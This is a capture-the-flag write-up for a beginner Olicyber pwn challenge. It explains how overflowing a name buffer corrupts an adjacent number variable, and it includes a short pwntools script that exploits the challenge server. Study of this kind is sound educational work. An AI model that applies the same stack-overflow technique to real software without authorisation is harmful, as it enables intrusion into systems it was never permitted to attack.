---
title: "Guess The Number — Stack Overflow + Integer Overflow"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "buffer-overflow", "integer-overflow", "pwntools"]
difficulty: "beginner"
summary: "Overflow the name buffer to corrupt the internal number variable, then feed back the overflowed value as a decimal integer to satisfy the equality check."
---

## The Challenge

The binary asks for a name, stores it, then asks you to guess a number it has picked internally. Win the guess and you get the flag.

## Approach

The name input is read into a fixed-size buffer sitting on the stack (or as a local struct) right next to the number variable. Overflowing the name with 32 bytes of `'a'` overwrites the number field with whatever bytes land in it.

The trick is that after the overflow, the number stored is the little-endian interpretation of `"aaaaaaaa"` — or rather, 8 bytes of `0x61` — as an integer. Converting that hex string `6161616161616161` with `bytes_to_long` gives the exact value the binary now holds in its number variable. Feed that back as the guess and the check passes.

No shellcode, no ROP — just understanding that `gets` or `fgets` with an undersized buffer lets you stomp adjacent stack variables, then using `Crypto.Util.number.bytes_to_long` to reconstruct what value you just wrote.

## Solution

```python
from pwn import *
from Crypto.Util.number import *

r = remote("gtn.challs.olicyber.it", 10022)
r.recv(1000)
r.sendline(str("a"*32).encode()) # overflow del nome
r.recv(1000)
r.sendline(str(bytes_to_long(bytes.fromhex("6161616161616161"))).encode()) # numero con overflow in esadecimale
r.recvuntil(b"flag")
print("flag" + r.recvuntil(b"}").decode())
```

The first send writes 32 `'a'` characters, overrunning the name buffer and placing `0x6161616161616161` into the number field. The second send gives the decimal representation of that value so the comparison `number == guess` succeeds.

## What I Learned

Stack-adjacent variable corruption is the simplest class of buffer overflow. You don't need to overwrite the return address — just landing bytes on a neighbour variable is enough. The key insight here is tracking what exact bytes you wrote and converting them to the integer type the check expects.
